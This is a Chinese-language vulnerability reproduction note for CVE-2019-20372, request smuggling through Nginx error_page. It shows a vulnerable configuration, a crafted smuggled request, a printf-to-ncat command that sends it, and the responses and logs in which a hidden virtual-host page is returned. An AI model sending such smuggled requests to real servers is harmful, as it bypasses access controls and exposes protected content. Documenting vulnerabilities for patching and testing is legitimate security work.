---
title: （CVE-2019-20372）Nginx error_page 请求走私漏洞
id: zhfly3048
---

# （CVE-2019-20372）Nginx error_page 请求走私漏洞

## 一、漏洞简介

Nginx 1.17.7之前版本中 error_page 存在安全漏洞。攻击者可利用该漏洞读取未授权的Web页面。

## 二、漏洞影响

Ngnix < 1.17.7

## 三、复现过程

> 错误配置

```
server {
 listen 80;
 server_name localhost;
 error_page 401 http://example.org;
 location / {
 return 401;
 }
}
server {
 listen 80;
 server_name notlocalhost;
 location /_hidden/index.html {
 return 200 'This should be hidden!';
 }
} 
```

这时候我们可以向服务器发送以下请求

```
GET /a HTTP/1.1
Host: localhost
Content-Length: 56
GET /_hidden/index.html HTTP/1.1
Host: notlocalhost 
```

我们看一下服务器是怎么处理的

```
printf "GET /a HTTP/1.1\r\nHost: localhost\r\nContent-Length: 56\r\n\r\nGET
/_hidden/index.html HTTP/1.1\r\nHost: notlocalhost\r\n\r\n" | ncat localhost 80 --noshutdown 
```

等于说是吧两个请求都间接的执行了，我们看一下burp里面的返回值

```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.17.6
Date: Fri, 06 Dec 2019 18:23:33 GMT
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: http://example.org
<html>
<head><title>302 Found</title></head>
<body>
<center><h1>302 Found</h1></center>
<hr><center>nginx/1.17.6</center>
</body>
</html>
HTTP/1.1 200 OK
Server: nginx/1.17.6
Date: Fri, 06 Dec 2019 18:23:33 GMT
Content-Type: text/html
Content-Length: 22
Connection: keep-alive
This should be hidden! 
```

再一下nginx服务器里面的日志

```
172.17.0.1 - - [06/Dec/2019:18:23:33 +0000] "GET /a HTTP/1.1" 302 145 "-" "-" "-"
172.17.0.1 - - [06/Dec/2019:18:23:33 +0000] "GET /_hidden/index.html HTTP/1.1" 200 22 "-" 
```